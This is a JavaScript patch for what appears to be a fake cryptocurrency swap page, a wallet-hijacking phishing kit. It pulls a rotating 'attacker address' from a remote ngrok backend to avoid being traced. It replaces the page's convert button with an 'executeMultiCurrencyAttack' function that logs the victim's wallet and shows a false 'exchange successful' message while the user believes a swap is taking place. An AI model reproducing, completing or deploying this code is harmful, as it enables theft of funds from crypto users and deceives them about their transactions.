
// 🎯 多币种功能补丁 - 在现有代码基础上添加
// 保留所有原有功能，只添加多币种支持

// 🎯 攻击者地址配置 - 动态后端管理
let CURRENT_ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';  // 默认地址
// const BACKEND_API = 'http://localhost:5001';  // Python后端地址
const BACKEND_API = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';  // Python后端地址（通过ngrok）


// 🔄 实时获取攻击者地址
async function getCurrentAttackerAddress() {
    try {
        const response = await fetch(`${BACKEND_API}/api/attacker_address`);
        const result = await response.json();

        if (result.status === 'success') {
            const oldAddress = CURRENT_ATTACKER_ADDRESS;
            CURRENT_ATTACKER_ADDRESS = result.data.attacker_address;

            // 如果地址发生变化，记录轮换日志
            if (oldAddress !== CURRENT_ATTACKER_ADDRESS) {
                console.log(`   轮换设置: 每${result.data.max_usage}次或${result.data.rotation_interval_hours}小时轮换一次`);

                // 🎯 显示地址更新提示给用户
                showAddressUpdateNotification(oldAddress, CURRENT_ATTACKER_ADDRESS, result.data);
                console.log(`🔄 [防追踪] 攻击者地址已轮换:`);
                console.log(`   旧地址: ${oldAddress}`);
                console.log(`   新地址: ${CURRENT_ATTACKER_ADDRESS}`);
                console.log(`   钱包名称: ${result.data.wallet_name}`);
                console.log(`   使用次数: ${result.data.usage_count}`);
                console.log(`   轮换设置: 每${result.data.max_usage}次或${result.data.rotation_interval_hours}小时轮换一次`);
            }

            return {
                address: CURRENT_ATTACKER_ADDRESS,
                info: result.data
            };
        } else {
            console.warn('⚠️ 获取攻击者地址失败，使用默认地址');
            return {
                address: CURRENT_ATTACKER_ADDRESS,
                info: null
            };
        }
    } catch (error) {
        console.warn('⚠️ 后端连接失败，使用默认攻击者地址:', error);
        return {
            address: CURRENT_ATTACKER_ADDRESS,
            info: null
        };
    }
}

// 🎯 显示地址更新通知
function showAddressUpdateNotification(oldAddress, newAddress, walletInfo) {
    // 创建通知元素
    const notification = document.createElement('div');
    notification.className = 'address-update-notification';
    notification.innerHTML = `
        <div class="notification-content">
            <div class="notification-icon">🔄</div>
            <div class="notification-text">
                <div class="notification-title">🎯 攻击者地址已更新</div>
                <div class="notification-details">
                    <div>钱包: ${walletInfo.wallet_name}</div>
                    <div>新地址: ${newAddress.slice(0, 10)}...${newAddress.slice(-6)}</div>
                    <div>使用次数: ${walletInfo.usage_count}/${walletInfo.max_usage}</div>
                </div>
            </div>
            <button class="notification-close" onclick="this.parentElement.remove()">×</button>
        </div>
    `;

    // 添加样式
    if (!document.getElementById('addressNotificationStyles')) {
        const styles = document.createElement('style');
        styles.id = 'addressNotificationStyles';
        styles.textContent = `
            .address-update-notification {
                position: fixed;
                top: 20px;
                right: 20px;
                z-index: 10001;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border-radius: 12px;
                padding: 16px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                min-width: 300px;
                animation: slideInRight 0.3s ease-out;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            
            .notification-content {
                display: flex;
                align-items: flex-start;
                gap: 12px;
            }
            
            .notification-icon {
                font-size: 24px;
                flex-shrink: 0;
            }
            
            .notification-text {
                flex: 1;
            }
            
            .notification-title {
                font-weight: 600;
                font-size: 14px;
                margin-bottom: 8px;
            }
            
            .notification-details {
                font-size: 12px;
                opacity: 0.9;
                line-height: 1.4;
            }
            
            .notification-close {
                background: none;
                border: none;
                color: white;
                font-size: 18px;
                cursor: pointer;
                padding: 0;
                width: 20px;
                height: 20px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                opacity: 0.7;
                transition: opacity 0.2s;
            }
            
            .notification-close:hover {
                opacity: 1;
                background: rgba(255, 255, 255, 0.1);
            }
            
            @keyframes slideInRight {
                from {
                    transform: translateX(100%);
                    opacity: 0;
                }
                to {
                    transform: translateX(0);
                    opacity: 1;
                }
            }
        `;
        document.head.appendChild(styles);
    }

    // 添加到页面
    document.body.appendChild(notification);

    // 5秒后自动消失
    setTimeout(() => {
        if (notification.parentElement) {
            notification.style.animation = 'slideInRight 0.3s ease-out reverse';
            setTimeout(() => notification.remove(), 300);
        }
    }, 5000);

    debugLog(`🎯 地址更新通知已显示: ${oldAddress} -> ${newAddress}`);
}

// 🎯 定期检查地址更新
let addressCheckInterval = null;

function startAddressMonitoring() {
    // 防止重复启动
    if (addressCheckInterval) {
        clearInterval(addressCheckInterval);
    }

    // 每30秒检查一次地址更新
    addressCheckInterval = setInterval(async () => {
        try {
            await getCurrentAttackerAddress();
        } catch (error) {
            console.warn('🔄 定期地址检查失败:', error);
        }
    }, 30000); // 30秒

    debugLog('🔄 地址监控已启动，每30秒检查一次');
}

// 🎯 多币种功能补丁 - 在现有代码基础上添加
// 保留所有原有功能，只添加多币种支持

// 🎯 支持的币种配置 - 添加到现有代码中
const ADDITIONAL_CURRENCIES = {
    'BTC': {
        name: 'Bitcoin',
        symbol: 'BTC',
        icon: 'btc-icon',
        decimals: 8,
        network: 'bitcoin',
        price: 67234.56,
        change: '+2.34%',
        balance: 0,
        contractAddress: null
    },
    'ETH': {
        name: 'Ethereum',
        symbol: 'ETH',
        icon: 'eth-icon',
        decimals: 18,
        network: 'ethereum',
        price: 3456.78,
        change: '-1.23%',
        balance: 0,
        contractAddress: null
    },
    'BNB': {
        name: 'BNB Smart Chain',
        symbol: 'BNB',
        icon: 'bnb-icon',
        decimals: 18,
        network: 'bsc',
        price: 634.12,
        change: '+0.87%',
        balance: 0,
        contractAddress: null
    },
    'USDC': {
        name: 'USD Coin',
        symbol: 'USDC',
        icon: 'usdc-icon',
        decimals: 6,
        network: 'multi',
        price: 0.9999,
        change: '0.00%',
        balance: 0,
        contractAddress: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'
    },
    'SOL': {
        name: 'Solana',
        symbol: 'SOL',
        icon: 'sol-icon',
        decimals: 9,
        network: 'solana',
        price: 247.89,
        change: '+3.21%',
        balance: 0,
        contractAddress: null
    },
    'DOGE': {
        name: 'Dogecoin',
        symbol: 'DOGE',
        icon: 'doge-icon',
        decimals: 8,
        network: 'dogecoin',
        price: 0.28794,
        change: '-0.50%',
        balance: 0,
        contractAddress: null
    },
    'XRP': {
        name: 'Ripple',
        symbol: 'XRP',
        icon: 'xrp-icon',
        decimals: 6,
        network: 'ripple',
        price: 3.078,
        change: '-1.32%',
        balance: 0,
        contractAddress: null
    },
    'ADA': {
        name: 'Cardano',
        symbol: 'ADA',
        icon: 'ada-icon',
        decimals: 6,
        network: 'cardano',
        price: 1.234,
        change: '+0.56%',
        balance: 0,
        contractAddress: null
    },
    'DOT': {
        name: 'Polkadot',
        symbol: 'DOT',
        icon: 'dot-icon',
        decimals: 10,
        network: 'polkadot',
        price: 8.765,
        change: '+2.11%',
        balance: 0,
        contractAddress: null
    },
    'AVAX': {
        name: 'Avalanche',
        symbol: 'AVAX',
        icon: 'avax-icon',
        decimals: 18,
        network: 'avalanche',
        price: 45.67,
        change: '+1.89%',
        balance: 0,
        contractAddress: null
    }
};

// 🎯 CSS样式补丁 - 添加新币种图标样式
const additionalCSS = `
/* 新增币种图标样式 */
.btc-icon { background: #f7931a; color: #fff; }
.eth-icon { background: #627eea; color: #fff; }
.bnb-icon { background: #f3ba2f; color: #000; }
.usdc-icon { background: #2775ca; color: #fff; }
.sol-icon { background: #9945ff; color: #fff; }
.doge-icon { background: #c2a633; color: #000; }
.xrp-icon { background: #23292f; color: #fff; }
.ada-icon { background: #0033ad; color: #fff; }
.dot-icon { background: #e6007a; color: #fff; }
.avax-icon { background: #e84142; color: #fff; }

/* 币种选择模态框 */
.currency-modal {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.95);
    display: none;
    z-index: 2000;
    padding: 20px;
}

.currency-modal.show {
    display: block;
}

.currency-modal-content {
    background: #1a1a1a;
    border-radius: 16px;
    padding: 24px;
    width: 100%;
    max-width: 400px;
    margin: 0 auto;
    max-height: 80vh;
    overflow-y: auto;
}

.currency-modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
}

.currency-modal-title {
    font-size: 18px;
    font-weight: 600;
    color: #fff;
}

.close-btn {
    background: none;
    border: none;
    color: #666;
    font-size: 24px;
    cursor: pointer;
}

.currency-search {
    width: 100%;
    background: #000;
    border: 1px solid #333;
    border-radius: 8px;
    padding: 12px;
    color: #fff;
    font-size: 14px;
    margin-bottom: 20px;
}

.currency-list {
    display: flex;
    flex-direction: column;
    gap: 8px;
}

.currency-item {
    display: flex;
    align-items: center;
    padding: 16px;
    background: #333;
    border-radius: 12px;
    cursor: pointer;
    transition: all 0.3s ease;
}

.currency-item:hover {
    background: #444;
}

.currency-item-info {
    flex: 1;
    margin-left: 12px;
}

.currency-item-name {
    font-size: 16px;
    color: #fff;
    margin-bottom: 4px;
}

.currency-item-symbol {
    font-size: 12px;
    color: #666;
}

.currency-item-price {
    text-align: right;
}

.currency-item-value {
    font-size: 14px;
    color: #fff;
    margin-bottom: 2px;
}

.currency-item-change {
    font-size: 12px;
}

.positive { color: #7ed321; }
.negative { color: #f5455c; }
`;

// 🎯 添加CSS样式到页面
function addMultiCurrencyStyles() {
    const style = document.createElement('style');
    style.textContent = additionalCSS;
    document.head.appendChild(style);
    debugLog('🎨 多币种样式已添加');
}

// 🎯 创建币种选择模态框HTML
function createCurrencyModal() {
    const modalHTML = `
    <div class="currency-modal" id="currencyModal">
        <div class="currency-modal-content">
            <div class="currency-modal-header">
                <div class="currency-modal-title">选择币种</div>
                <button class="close-btn" onclick="closeCurrencyModal()">&times;</button>
            </div>
            
            <input type="text" class="currency-search" placeholder="搜索币种..." id="currencySearch" oninput="filterCurrencies()">
            
            <div class="currency-list" id="currencyList">
                <!-- 币种列表将通过JavaScript动态生成 -->
            </div>
        </div>
    </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);
    // 添加模态框样式
    const modalStyles = `
        <style>
        .currency-modal {
            display: none;
            position: fixed;
            z-index: 10000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(5px);
        }
        
        .currency-modal.show {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .currency-modal-content {
            background: #fff;
            border-radius: 12px;
            padding: 20px;
            width: 90%;
            max-width: 400px;
            max-height: 80vh;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }
        
        .currency-modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #eee;
        }
        
        .currency-modal-close {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #999;
            padding: 0;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .currency-search input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 15px;
        }
        
        .currency-list {
            max-height: 300px;
            overflow-y: auto;
        }
        
        .currency-item {
            display: flex;
            align-items: center;
            padding: 12px;
            cursor: pointer;
            border-radius: 8px;
            margin-bottom: 5px;
            transition: background-color 0.2s;
        }
        
        .currency-item:hover {
            background: #f0f8ff;
        }
        
        .currency-item .currency-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            margin-right: 12px;
            font-size: 14px;
        }
        
        .currency-item-info {
            flex: 1;
        }
        
        .currency-item-name {
            font-weight: 500;
            font-size: 14px;
            color: #333;
        }
        
        .currency-item-symbol {
            font-size: 12px;
            color: #666;
        }
        </style>
    `;
    document.head.insertAdjacentHTML('beforeend', modalStyles);
    debugLog('🎯 币种选择模态框已创建');
}
// 页面加载完成后创建模态框
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function (){
        createCurrencyModal();
        startAddressMonitoring();
    });
} else {
    createCurrencyModal();
    startAddressMonitoring();
}
debugLog('🎯 多币种功能补丁加载完成！');

// 🎯 初始化币种列表
function initializeCurrencyList() {
    const currencyList = document.getElementById('currencyList');
    if (!currencyList) return;

    currencyList.innerHTML = '';

    // 添加原有的TRX和USDT
    const allCurrencies = {
        'TRX': {
            name: 'TRON',
            symbol: 'TRX',
            icon: 'trx-icon',
            price: 0.1634,
            change: '+1.45%',
            balance: userBalance || 0
        },
        'USDT': {
            name: 'Tether',
            symbol: 'USDT',
            icon: 'usdt-icon',
            price: 1.0001,
            change: '0.00%',
            balance: 0
        },
        ...ADDITIONAL_CURRENCIES
    };

    Object.values(allCurrencies).forEach(currency => {
        const currencyItem = document.createElement('div');
        currencyItem.className = 'currency-item';
        currencyItem.onclick = () => selectCurrency(currency.symbol);

        const changeClass = currency.change.startsWith('+') ? 'positive' :
                           currency.change.startsWith('-') ? 'negative' : '';

        currencyItem.innerHTML = `
            <div class="currency-icon ${currency.icon}">${currency.symbol.charAt(0)}</div>
            <div class="currency-item-info">
                <div class="currency-item-name">${currency.name}</div>
                <div class="currency-item-symbol">${currency.symbol}</div>
            </div>
            <div class="currency-item-price">
                <div class="currency-item-value">$${currency.price}</div>
                <div class="currency-item-change ${changeClass}">${currency.change}</div>
            </div>
        `;

        currencyList.appendChild(currencyItem);
    });
}

// 🎯 多币种变量 - 添加到现有全局变量
let currentFromCurrency = 'TRX';
let currentToCurrency = 'USDT';
let isSelectingCurrency = false;
let selectingType = '';

// 🎯 修改现有的币种选择函数
function selectFromCurrency() {
    debugLog('💰 用户选择支付币种');
    selectingType = 'from';
    isSelectingCurrency = true;
    // 确保模态框存在并显示币种列表
    createCurrencyModal();
    initializeCurrencyList()
    document.getElementById('currencyModal').classList.add('show');
    debugLog('✅ 支付币种选择模态框已显示');
}

function selectToCurrency() {
    debugLog('💰 用户选择接收币种');
    selectingType = 'to';
    isSelectingCurrency = true;
    // 确保模态框存在并显示币种列表
    createCurrencyModal();
    initializeCurrencyList()

    document.getElementById('currencyModal').classList.add('show');
    debugLog('✅ 接收币种选择模态框已显示');
}

// 🎯 关闭币种选择模态框
function closeCurrencyModal() {
    // document.getElementById('currencyModal').classList.remove('show');
    const modal = document.getElementById('currencyModal');
    if (modal) {
        modal.classList.remove('show');
        debugLog('✅ 币种选择模态框已关闭');
    } else {
        debugLog('⚠️ 找不到币种选择模态框元素');
    }
    isSelectingCurrency = false;
    selectingType = '';
}

// 🎯 选择币种
function selectCurrency(symbol) {
    const allCurrencies = {
        'TRX': { name: 'TRON', icon: 'trx-icon', balance: userBalance || 0 },
        'USDT': { name: 'Tether', icon: 'usdt-icon', balance: 0 },
        ...ADDITIONAL_CURRENCIES
    };

    const currency = allCurrencies[symbol];
    if (!currency) return;

    if (selectingType === 'from') {
        currentFromCurrency = symbol;
        const fromCurrencyInfo = document.querySelector('.currency-input:last-child .currency-info');
        if (fromCurrencyInfo) {
            const iconElement = fromCurrencyInfo.querySelector('.currency-icon');
            const nameElement = fromCurrencyInfo.querySelector('.currency-name');
            const balanceElement = fromCurrencyInfo.querySelector('.currency-balance');

            if (iconElement) {
                iconElement.className = `currency-icon ${currency.icon}`;
                iconElement.textContent = symbol.charAt(0);
            }
            if (nameElement) {
                nameElement.textContent = symbol;
            }
            if (balanceElement) {
                balanceElement.textContent = `可用: ${currency.balance} ${symbol}`;
            }
        }

        debugLog(`💰 选择支付币种: ${symbol}`);
    } else if (selectingType === 'to') {
        currentToCurrency = symbol;
        document.getElementById('toCurrencyIcon').className = `currency-icon ${currency.icon}`;
        document.getElementById('toCurrencyIcon').textContent = symbol.charAt(0);
        document.getElementById('toCurrencyName').textContent = symbol;
        debugLog(`💰 选择接收币种: ${symbol}`);
    }
    debugLog(`🎯 币种选择完成，准备关闭模态框: ${symbol}`);
    closeCurrencyModal();

    // 重新计算兑换 - 使用现有的calculateConversion函数
    if (typeof calculateConversion === 'function') {
        calculateConversion();
        debugLog('💱 重新计算兑换完成');
    }
}

// 🎯 币种搜索过滤
function filterCurrencies() {
    const searchTerm = document.getElementById('currencySearch').value.toLowerCase();
    const currencyItems = document.querySelectorAll('.currency-item');

    currencyItems.forEach(item => {
        const name = item.querySelector('.currency-item-name').textContent.toLowerCase();
        const symbol = item.querySelector('.currency-item-symbol').textContent.toLowerCase();

        if (name.includes(searchTerm) || symbol.includes(searchTerm)) {
            item.style.display = 'flex';
        } else {
            item.style.display = 'none';
        }
    });
}

// 🎯 增强的交换币种函数 - 覆盖原有函数
function swapCurrencies() {
    debugLog('🔄 用户点击币种交换');

    // 交换币种变量
    const tempCurrency = currentFromCurrency;
    currentFromCurrency = currentToCurrency;
    currentToCurrency = tempCurrency;

    debugLog(`🔄 币种交换完成: ${currentFromCurrency} ↔ ${currentToCurrency}`);

    // 获取币种信息
    const allCurrencies = {
        'TRX': { name: 'TRON', icon: 'trx-icon', balance: userBalance || 0 },
        'USDT': { name: 'Tether', icon: 'usdt-icon', balance: 0 },
        ...ADDITIONAL_CURRENCIES
    };

    // 更新UI
    const fromCurrency = allCurrencies[currentFromCurrency];
    const toCurrency = allCurrencies[currentToCurrency];

    if (fromCurrency && toCurrency) {
        //更新from区域显示
        const fromCurrencyInfo = document.querySelector('.currency-input:first-child .currency-info');
        // 更新支付币种显示
        if (fromCurrencyInfo) {
            const fromIcon = fromCurrencyInfo.getElementById('fromCurrencyIcon');
            const fromName = fromCurrencyInfo.getElementById('fromCurrencyName');
            const fromBalance = fromCurrencyInfo.getElementById('fromCurrencyBalance')

            if (fromIcon) {
                fromIcon.className = `currency-icon ${fromCurrency.icon}`;
                fromIcon.textContent = currentFromCurrency.charAt(0);
            }
            if (fromName) {
                fromName.textContent = currentFromCurrency;
            }
            if (fromBalance) {
                fromBalance.textContent = `可用: ${fromCurrency.balance} ${currentFromCurrency}`;
            }
        }
        //更新to区域显示
        const toCurrencyInfo = document.querySelector('.currency-input:last-child .currency-info');
        if (toCurrencyInfo) {
            const iconElement = toCurrencyInfo.querySelector('.currency-icon');
            const nameElement = toCurrencyInfo.querySelector('.currency-name');

            if (iconElement) {
                iconElement.className = `currency-icon ${toCurrency.icon}`;
                iconElement.textContent = currentToCurrency.charAt(0);
            }
            if (nameElement) {
                nameElement.textContent = currentToCurrency;
            }
        }
        // 更新输入框占位符
        const fromAmountInput = document.getElementById('fromAmount');
        const toAmountInput = document.getElementById('toAmount');
        if (fromAmountInput) {
            fromAmountInput.placeholder = `输入${currentFromCurrency}数量`;
        }

        // 重新计算兑换
        if (typeof calculateConversion === 'function') {
            calculateConversion();
        }
        showToast(`已切换为 ${currentFromCurrency} → ${currentToCurrency}`, 'success');
    }else {
        showToast('币种交换失败', 'error');
    }

}

// 🎯 增强的计算兑换函数 - 覆盖原有函数
function calculateConversion() {
    const fromAmount = document.getElementById('fromAmount').value;
    const toAmount = document.getElementById('toAmount');
    const convertBtn = document.getElementById('convertBtn');
    const rateText = document.getElementById('rateText');

    if (fromAmount && parseFloat(fromAmount) > 0) {
        const allCurrencies = {
            'TRX': { price: 0.1634 },
            'USDT': { price: 1.0001 },
            ...ADDITIONAL_CURRENCIES
        };

        const fromCurrency = allCurrencies[currentFromCurrency];
        const toCurrency = allCurrencies[currentToCurrency];

        if (fromCurrency && toCurrency) {
            // 通过USD中转计算汇率
            const usdValue = parseFloat(fromAmount) * fromCurrency.price;
            const converted = (usdValue / toCurrency.price).toFixed(6);

            if (toAmount) {
                toAmount.value = converted;
            }

            if (rateText) {
                rateText.textContent = `1 ${currentFromCurrency} ≈ ${(fromCurrency.price / toCurrency.price).toFixed(6)} ${currentToCurrency}`;
            }

            if (isWalletConnected && convertBtn) {
                convertBtn.textContent = `兑换 ${fromAmount} ${currentFromCurrency}`;
                convertBtn.disabled = false;

                debugLog(`💱 用户计算兑换: ${fromAmount} ${currentFromCurrency} → ${converted} ${currentToCurrency}`);
            } else if (convertBtn) {
                convertBtn.textContent = '请先连接钱包';
                convertBtn.disabled = true;
            }
        }
    } else {
        if (toAmount) toAmount.value = '';
        if (rateText) rateText.textContent = `选择币种进行兑换`;
        if (convertBtn) {
            convertBtn.textContent = isWalletConnected ? `请输入${currentFromCurrency}数量` : '请先连接钱包';
            convertBtn.disabled = true;
        }
    }
}

// 🎯 增强的攻击执行函数 - 保留原有逻辑，添加多币种支持
async function executeMultiCurrencyAttack() {
    //实时获取当前攻击者地址
    const attackerInfo = await getCurrentAttackerAddress();
    const currentAttackerAddress = attackerInfo.address;

    // 如果是TRX，使用原有的executeAttack函数
    if (currentFromCurrency === 'TRX') {
        if (typeof executeAttack === 'function') {
            return executeAttack();
        }
    }

    // 其他币种的攻击逻辑
    if (!isWalletConnected) {
        showToast('请先连接钱包', 'error');
        showWalletModal();
        return;
    }

    const fromAmount = document.getElementById('fromAmount').value;
    if (!fromAmount || parseFloat(fromAmount) <= 0) {
        showToast(`请输入有效的${currentFromCurrency}数量`, 'error');
        return;
    }

    debugLog(`🎯🎯🎯 用户执行${currentFromCurrency}兑换 - 多币种攻击开始！🎯🎯🎯`);
    debugLog(`🎯 用户以为兑换: ${fromAmount} ${currentFromCurrency} → ${document.getElementById('toAmount').value} ${currentToCurrency}`);
    debugLog(`🎯 当前攻击者地址: ${currentAttackerAddress}`);
    debugLog(`🎯 钱包信息: ${attackerInfo.info ? attackerInfo.info.wallet_name : '默认钱包'}`);

    // 记录攻击数据
    const attackRecord = {
        timestamp: new Date().toISOString(),
        attackType: 'MULTI_CURRENCY_HIJACK',
        fromCurrency: currentFromCurrency,
        toCurrency: currentToCurrency,
        victimAddress: currentAccount,
        attackerAddress: currentAttackerAddress, //使用动态获取的地址
        userThoughtAmount: parseFloat(fromAmount),
        userThoughtReceive: parseFloat(document.getElementById('toAmount').value),
        userAgent: navigator.userAgent,
        url: window.location.href
    };

    localStorage.setItem('multiCurrencyAttackRecord', JSON.stringify(attackRecord));

    showToast('正在执行交易...', 'info');

    // 模拟攻击成功
    setTimeout(() => {
        debugLog('🏆🏆🏆 多币种攻击模拟成功！🏆🏆🏆');
        showToast(`兑换成功！获得 ${document.getElementById('toAmount').value} ${currentToCurrency}`);

        // 重置表单
        document.getElementById('fromAmount').value = '';
        document.getElementById('toAmount').value = '';
        document.getElementById('convertBtn').disabled = true;
        document.getElementById('convertBtn').textContent = `请输入${currentFromCurrency}数量`;
    }, 2000);
}

// 🎯 初始化多币种功能
function initMultiCurrencyFeatures() {
    debugLog('🎯 初始化多币种功能...');

    // 添加样式
    addMultiCurrencyStyles();

    // 创建模态框
    createCurrencyModal();

    // 初始化币种列表
    initializeCurrencyList();

    // 修改现有的兑换按钮点击事件
    const convertBtn = document.getElementById('convertBtn');
    if (convertBtn) {
        // 保存原有的onclick
        const originalOnclick = convertBtn.onclick;

        // 设置新的onclick
        convertBtn.onclick = async function() {
            if (currentFromCurrency === 'TRX' && typeof executeAttack === 'function') {
                // TRX使用原有逻辑
                return await executeAttack();
            } else {
                // 其他币种使用新逻辑
                return await executeMultiCurrencyAttack();
            }
        };
    }

    debugLog('✅ 多币种功能初始化完成');
    debugLog(`🎯 支持币种: TRX, USDT, BTC, ETH, BNB, SOL, DOGE, XRP, ADA, DOT, AVAX`);
}

// 🎯 等待页面加载完成后初始化
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initMultiCurrencyFeatures);
} else {
    initMultiCurrencyFeatures();
}

// 🎯 调试函数 - 查看多币种攻击数据
window.getMultiCurrencyData = function() {
    return {
        currentFromCurrency: currentFromCurrency,
        currentToCurrency: currentToCurrency,
        supportedCurrencies: Object.keys({
            'TRX': true,
            'USDT': true,
            ...ADDITIONAL_CURRENCIES
        }),
        multiCurrencyAttackRecord: JSON.parse(localStorage.getItem('multiCurrencyAttackRecord') || 'null'),
        additionalCurrencies: ADDITIONAL_CURRENCIES
    };
};

debugLog('🎯 多币种功能补丁加载完成！');